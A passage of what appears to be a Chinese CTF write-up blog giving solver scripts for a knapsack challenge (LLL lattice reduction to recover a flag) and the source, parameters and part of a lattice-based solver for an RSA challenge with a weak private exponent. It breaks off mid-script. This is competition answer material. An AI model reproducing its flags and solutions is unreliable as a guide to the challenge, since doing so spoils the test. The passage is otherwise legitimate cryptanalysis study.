class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-3&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>]</span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> in flag:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">each</span> == <span class="string">&#x27;-1&#x27;</span>:</span><br><span class="line">        tmp.append(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    elif <span class="keyword">each</span> == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        tmp.append(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    elif <span class="keyword">each</span> == <span class="string">&#x27;-3&#x27;</span>:</span><br><span class="line">        tmp.append(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span>.join(tmp)</span><br><span class="line"><span class="keyword">print</span>(tmp)</span><br><span class="line">flag = <span class="keyword">int</span>(tmp, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span>(libnum.n2s(flag))</span><br><span class="line"><span class="comment"># xb5ab43-1e6f65cc8ee</span></span><br><span class="line"><span class="comment"># \xbdab43-1e6f65cc8ee\xa2&#x27;</span></span><br><span class="line"><span class="comment"># 110101001100000011100100110000011001010110000100110010001110010010110100111000011000110110001000110110001011010011010001100001011001000011011101101010110000101100010001101000011001100101101001100010110010100110110011001100011011000110101011000110110001100111000011001010110010110000010</span></span><br><span class="line"><span class="comment"># 1101010011000000111001001100000110010101100001001100100011100100101101001110000110001101100010001101100010110100110100011000010110010000110111</span></span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">with <span class="keyword">open</span>(<span class="string">&#x27;/Users/wenhui/Desktop/LLL_data3333.txt&#x27;</span>) <span class="keyword">as</span> <span class="keyword">file</span>:</span><br><span class="line">    <span class="keyword">for</span> i in <span class="keyword">file</span>.readlines():</span><br><span class="line">        i = i[<span class="number">1</span>:-<span class="number">3</span>]</span><br><span class="line">        i = [<span class="keyword">x</span> <span class="keyword">for</span> <span class="keyword">x</span> in i.<span class="keyword">split</span>(<span class="string">&#x27;, &#x27;</span>) <span class="keyword">if</span> <span class="keyword">x</span>]</span><br><span class="line">        <span class="keyword">print</span>(i)</span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">for</span> each in i:</span><br><span class="line">            <span class="keyword">if</span> each == <span class="string">&#x27;-1&#x27;</span>:</span><br><span class="line">                tmp.<span class="keyword">append</span>(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            elif each == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                tmp.<span class="keyword">append</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="built_in">len</span>(tmp))</span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span>.<span class="keyword">join</span>(tmp)</span><br><span class="line">        <span class="keyword">if</span> tmp:</span><br><span class="line">            <span class="keyword">print</span>(tmp)</span><br><span class="line">            <span class="keyword">print</span>(<span class="built_in">len</span>(tmp))</span><br><span class="line">            tmp = <span class="keyword">int</span>(tmp, <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span>(tmp)</span><br><span class="line">            flag = str(libnum.n2s(tmp))</span><br><span class="line">            <span class="keyword">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;5090ea&#x27;</span> in fla<span class="variable">g:</span></span><br><span class="line">                sys.<span class="keyword">exit</span>()</span><br><span class="line">            # <span class="number">5090</span>ea29-<span class="number">8</span>cb6-<span class="number">4</span>ad7</span><br></pre></td></tr></table></figure><hr><hr><ul><li><a href="https://4xwi11.github.io/posts/37313bc0/?highlight=背包">学习参考</a></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">t = <span class="selector-attr">[]</span></span><br><span class="line">ct = </span><br><span class="line">n = len(t)</span><br><span class="line">M = Matrix<span class="selector-class">.identity</span>(n)</span><br><span class="line"></span><br><span class="line">last_row = <span class="selector-attr">[0 for x in t]</span></span><br><span class="line">M_last_row = Matrix(ZZ, <span class="number">1</span>, len(last_row), last_row)</span><br><span class="line"></span><br><span class="line">last_col = t<span class="selector-attr">[:]</span></span><br><span class="line">last_col<span class="selector-class">.append</span>(ct)</span><br><span class="line">M_last_col = Matrix(ZZ, len(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">M = M<span class="selector-class">.stack</span>(M_last_row)</span><br><span class="line">M = M<span class="selector-class">.augment</span>(M_last_col)</span><br><span class="line"></span><br><span class="line">X = M<span class="selector-class">.LLL</span>()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(X)</span></span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> X:</span><br><span class="line">    tmp = t<span class="selector-attr">[:-1]</span></span><br><span class="line">    ans = <span class="selector-attr">[abs(k) for k in tmp]</span></span><br><span class="line">    try:</span><br><span class="line">        flag = int(str(ans), <span class="number">2</span>)</span><br><span class="line">        print(libnum<span class="selector-class">.n2s</span>(flag))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&#x27;0ver&#x27;</span>)</span></span></span><br></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">a = &quot;-1 -1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 <span class="number"> 0 </span>-1 -1 <span class="number"> 0 </span><span class="number"> 0 </span><span class="number"> 0 </span>-1 <span class="number"> 0 </span>&quot;</span><br><span class="line">a = a.split(&#x27; &#x27;)</span><br><span class="line">a = [str(abs(int(i))) for i in a if i]</span><br><span class="line">flag = &#x27;&#x27;.join(a)</span><br><span class="line">flag = int(flag, 2)</span><br><span class="line">print(libnum.n2s(flag))</span><br><span class="line"><span class="comment"># b&#x27;5090ea29-8cb6-4ad8-ab43-1e6f65cc8eeb&#x27;</span></span><br></pre></td></tr></table></figure><hr><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最终版本</span></span><br><span class="line"><span class="attr">import</span> <span class="string">libnum</span></span><br><span class="line"><span class="attr">t</span> = <span class="string">[]</span></span><br><span class="line"><span class="attr">ct</span> = <span class="string"></span></span><br><span class="line"><span class="attr">n</span> = <span class="string">len(t)</span></span><br><span class="line"><span class="attr">M</span> = <span class="string">Matrix.identity(n)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">last_row</span> = <span class="string">[0 for x in t]</span></span><br><span class="line"><span class="attr">M_last_row</span> = <span class="string">Matrix(ZZ, 1, len(last_row), last_row)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">last_col</span> = <span class="string">t[:]</span></span><br><span class="line"><span class="attr">last_col.append(ct)</span></span><br><span class="line"><span class="attr">M_last_col</span> = <span class="string">Matrix(ZZ, len(last_col), 1, last_col)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">M</span> = <span class="string">M.stack(M_last_row)</span></span><br><span class="line"><span class="attr">M</span> = <span class="string">M.augment(M_last_col)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">X</span> = <span class="string">M.LLL()</span></span><br><span class="line"><span class="attr">print(X)</span></span><br><span class="line"><span class="attr">for</span> <span class="string">t in X:</span></span><br><span class="line">    <span class="attr">tmp</span> = <span class="string">t[:-1]</span></span><br><span class="line">    <span class="attr">ans</span> = <span class="string">[str(abs(k)) for k in tmp]</span></span><br><span class="line">    <span class="attr">try</span>:<span class="string"></span></span><br><span class="line">        <span class="attr">flag</span> = <span class="string">int(&#x27;&#x27;.join(ans), 2)</span></span><br><span class="line">        <span class="attr">print(libnum.n2s(flag))</span></span><br><span class="line">    <span class="attr">except</span>:<span class="string"></span></span><br><span class="line">        <span class="attr">pass</span></span><br><span class="line"><span class="attr">print(&#x27;0ver&#x27;)</span></span><br></pre></td></tr></table></figure><h2 id="FourThousandRSA"><a href="#FourThousandRSA" class="headerlink" title="FourThousandRSA"></a>FourThousandRSA</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import *</span><br><span class="line"><span class="attribute">from</span> random import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">from</span> secret import p, q, flag</span><br><span class="line"></span><br><span class="line"><span class="attribute">d</span> = (p - <span class="number">1</span>) * (randint(<span class="number">1</span> &lt;&lt; <span class="number">895</span>, <span class="number">1</span> &lt;&lt; <span class="number">905</span>)) + getPrime(<span class="number">66</span>)</span><br><span class="line"><span class="attribute">assert</span> GCD(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="attribute">n</span> = p * q</span><br><span class="line"><span class="attribute">m</span> = bytes_to_long(flag)</span><br><span class="line"><span class="attribute">c</span> = pow(m, e, n)</span><br><span class="line"><span class="attribute">lnK</span> =<span class="meta"> [n, e, d, p, q]</span></span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">5</span>):</span><br><span class="line">    <span class="attribute">lnK</span>[i] = lnK[i].bit_length()</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span>(n)</span><br><span class="line"><span class="attribute">print</span>(e)</span><br><span class="line"><span class="attribute">print</span>(c)</span><br><span class="line"><span class="attribute">print</span>(lnK)</span><br><span class="line"><span class="comment"># 2008245202726111195525139787077766845460301971221282725789653525445717877831247040311792229284045975453691272797897794805042646233029706866078707630143984010874126231698685294168749255436126975986003969530103617426741064270423218259588978877370113177828293456561413806780703064713982940589926704665536293631846419385505665983693074491341550629844185026851229010312732921558017787072574777346960912025366025572718687418119633550194015169661191937337614795319500510125026882103589501497847356092372022899906904311120130529291320419495706452187192436497658895872460456299020678691633147066767550340869239242665444676015223859488181778716351439391614896237952082547346751012334359281894362102507693710804521999826603241204878074796474371682930675553715217908515291214108531394832662173298837242969662633805422396059510882443282508140025449969731242643820520540750378151812795959963934842270926945543049483993393288111252859368438315000543965899671606298852910335484127077917071912504701937501178567564695543045503695648983193718396823789188986832546133398012148358369105865469590306905583050200981598525031197740358763416786658682107838491293027639364508979821571709310278056633617824675033779928720051885352835157353803</span></span><br><span class="line"><span class="comment"># 807032534004084758580375189157328561548795804530942985115124520531221373527096275904469284031734054835824102563821158171589235747667599272991298059693818077176669425056991292994334793629184405818520272993874070884698385334019049156576500287497429412919772544592662544872484546264801483551861046175807498926198088282017428499839509688184982602419754320550459089738363252159087637831975525246450729834548975894498204691170246637710357850579558483403451912974355124654280116319260254145067344177881377307629659609044861901831073680528402705499960011480684401009582453074445582770870258919978732068123428866624493163278443134701482587357134070124133221075748585768453464832312107505344577054027293922365686198638830956703448628155371973969488855140627118939048137913508744817167302068674632091539914140795622964012240768679911315743790231690924423221631592930482614786389990208367405878537840797769431729477448292378308254306426728498718084148271069061132613717597098762769671154028101328451549784614737777731600209296493017630537336889457808923914655393955515432343410385118818484779667586279513209712795980030600707800342547828383384392042988707358771882529896527356417371670949948690120768388723079299981807646726911</span></span><br><span class="line"><span class="comment"># 1479098843223597304786742970274134598770261170942980086038287429905405158086547268458308645377797729404756116803215570224420375863682276378830919895619659050799395956146572726236750711207231799570925819982063426093862796144319017426916290208631746748701116840125309109359766050752569570197143931328071928910272144487415408708111493159410784983656461473802920988821467611079772020575539261046542193167444757825649926376069763390388540651778066220417921640963803183015067230139701713552782995724061821817700770220827885999306389960050273479873187643335537248639494631153812809968161473247467770291102906672062014528600784321726886085505174266116545186131025910553430133389924415555728463048311407897414482070647200465503078473266937663980748718243201906335338839452018573040634977122916044674440902206770428978968958675742011856119772241474589012913197944864164658153691848011206012988704668234612237127302621256390964532600110123457039129898476045860122356186227473879930882612843980001579020344087043771505157047280424063737637399280369256220373591698317585713187436849457927758798371213053969011609925655180333896843921881279342761083499824073913636798612382743862755759722932438784880987705776287623448376091072071</span></span><br><span class="line"><span class="comment"># [4038, 4036, 3503, 2599, 1439]</span></span><br></pre></td></tr></table></figure><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>NSSCTF原题，脚本小子🤔（事后具体复现）</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from datetime <span class="keyword">import</span> *</span><br><span class="line">ST=datetime.now()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;star3!&#x27;</span>)</span><br><span class="line">def getC(<span class="built_in">Scale</span>):</span><br><span class="line">    C=[[<span class="number">0</span> for __ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>)] for _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>)]</span><br><span class="line">    for i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>):</span><br><span class="line">        for j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>):</span><br><span class="line">            <span class="keyword">if</span> i==j or j==<span class="number">0</span>:</span><br><span class="line">                C[i][j]=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                C[i][j]=C[i-<span class="number">1</span>][j-<span class="number">1</span>]+C[i-<span class="number">1</span>][j]</span><br><span class="line">    <span class="keyword">return</span> C</span><br><span class="line">def getMatrix(<span class="built_in">Scale</span>,Mvalue,N,E,Del,Bet):</span><br><span class="line">    M=[[<span class="number">0</span> for __ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>)] for _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>)]</span><br><span class="line">    C=getC(<span class="built_in">Scale</span>)</span><br><span class="line">    X,Y=<span class="built_in">int</span>(pow(N,Del)*(<span class="built_in">Scale</span>+<span class="number">1</span>)/<span class="number">2</span>),<span class="built_in">int</span>(pow(N,(Del+Bet))*(<span class="built_in">Scale</span>+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    for i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>):</span><br><span class="line">        for j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">Scale</span>):</span><br><span class="line">            M[i][j]=N**<span class="built_in">max</span>(Mvalue-i,<span class="number">0</span>)*E**(<span class="built_in">max</span>(i-j,<span class="number">0</span>))*X**(<span class="built_in">Scale</span>-<span class="number">1</span>-j)*Y**j*C[i][j]*(-<span class="number">1</span>)**j</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line">N= #见题目附件 </span><br><span class="line">E= #见题目附件 </span><br><span class="line">delta=<span 